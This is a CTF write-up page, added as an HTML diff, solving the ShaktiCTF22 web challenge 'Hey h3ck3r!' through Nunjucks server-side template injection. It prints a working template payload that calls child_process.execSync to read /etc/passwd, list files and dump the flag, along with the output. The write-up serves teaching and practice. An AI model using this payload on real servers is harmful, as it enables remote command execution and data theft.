@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF22/web/Hey_h3ck3r!/">
+        <link rel="shortcut icon" href="../../../img/favicon.ico">
+        <title>Hey h3ck3r! - CTF-Writeups</title>
+        <link href="../../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+        <script src="../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+
+        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+            <div class="container">
+
+                <!-- Collapsed navigation -->
+                <div class="navbar-header">
+                    <!-- Expander button -->
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="../../..">CTF-Writeups</a>
+                </div>
+
+                <!-- Expanded navigation -->
+                <div class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li >
+                                <a href="../../../about/">About Us</a>
+                            </li>
+                            <li >
+                                <a href="../../../shaktictf/">ShaktiCTF</a>
+                            </li>
+                            <li >
+                                <a href="https://team-shakti.github.io/">Website</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav navbar-right">
+                        <li>
+                            <a href="#" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF22/web/Hey_h3ck3r!.md">Edit on Team-Shakti/CTF-Write-ups</a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+                <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
+    <ul class="nav bs-sidenav">
+        <li class="main active"><a href="#hey-h3ck3r">Hey h3ck3r!</a></li>
+    </ul>
+</div></div>
+                <div class="col-md-9" role="main">
+
+<h1 id="hey-h3ck3r">Hey h3ck3r!</h1>
+<p>Description: May I know your name?
+Author: <a href="https://twitter.com/AvanthikaAnand1?t=U4sSUyEOg7VPPZ_0S6LybQ&amp;s=09">Av4nth1ka</a></p>
+<p>Solution:</p>
+<p>So, this is a very basic Node Server-Side Template Injection challenge.</p>
+<p>First we get a page with a field to enter our username.</p>
+<p>So, if we enter any name in the username field we get a message as “Hello <your-name>”.</p>
+<p>So, we can see that whatever contents we give in the field will be displayed along with Hello.</p>
+<p>So, a thing which we can try in such cases is SSTI.</p>
+<p>Lets try a basic payload: {{2*2}}</p>
+<p>Yes!! We can confirm that this page is vulnerable to SSTI from the above case. Looking at the response headers, we can see there is a header as **<code>x-powered-by:** Express</code></p>
+<p>So, we know that Express is a node-js web application framework. So this a node SSTI vulnerability. Next we need to find which template this application is using in order to craft payload.</p>
+<p>There is a number of templates in Nodejs. Lets try with a payload of any template.</p>
+<p>I got an error like this:</p>
+<p>Template render error: (unknown path) [Line 6, Column 23]
+  unexpected token: :
+    at Object._prettifyError (/node_modules/nunjucks/src/lib.js:36:11)
+    at Template.render (/node_modules/nunjucks/src/environment.js:538:21)
+    at Environment.renderString (/node_modules/nunjucks/src/environment.js:380:17)
+    at Object.renderString (/node_modules/nunjucks/index.js:99:14)
+    at getHTML (/home/index.js:18:21)
+    at app.post (/home/index.js:27:16)
+    at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5)
+    at next (/node_modules/express/lib/router/route.js:144:13)
+    at Route.dispatch (/node_modules/express/lib/router/route.js:114:3)
+    at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5)</p>
+<p>There was an error in rendering the template. Also we can see something called <code>nunjucks</code>. When we search for it, we can see that it a template in node-js vulnerable to SSTI.</p>
+<p>Read more about nunjucks: </p>
+<p>Lets try using the following payload to dump the data in /etc/passwd.</p>
+<p>payload:  <code>{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')")()}}</code></p>
+<p>We get the following output:
+<code>Hello root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false node:x:1000:1000::/home/node:/bin/bash</code></p>
+<p>So, yeah our payload works now! Lets try to dump the files in the current directory, Now we need to find where the flag is located.</p>
+<p>payload: <code>{{range.constructor("return global.process.mainModule.require('child_process').execSync('ls')")()}}</code></p>
+<p>So, we got the files in the current directory.</p>
+<p><code>Dockerfile flag index.js node package-lock.json package.json</code></p>
+<p>Lets try to print the contents in the flag file.</p>
+<p>payload: <code>{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat flag')")()}}</code></p>
+<p>So we got the flag!!</p>
+<p>Flag: <code>shaktictf{ohh!!!_nuunjucksssss_ssti}</code></p></div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2020 <a href="http://Team-Shakti.github.io/">Team-Shakti Writeups</a></p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../../..",
+                shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
+        </script>
+        <script src="../../../js/base.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+        <script src="../../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Search</h4>
+            </div>
+            <div class="modal-body">
+                <p>
+                    From here you can search these documents. Enter
+                    your search terms below.
+                </p>
+                <form role="form">
+                    <div class="form-group">
+                        <input type="text" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="Keyboard Shortcuts Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Keyboard Shortcuts</h4>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
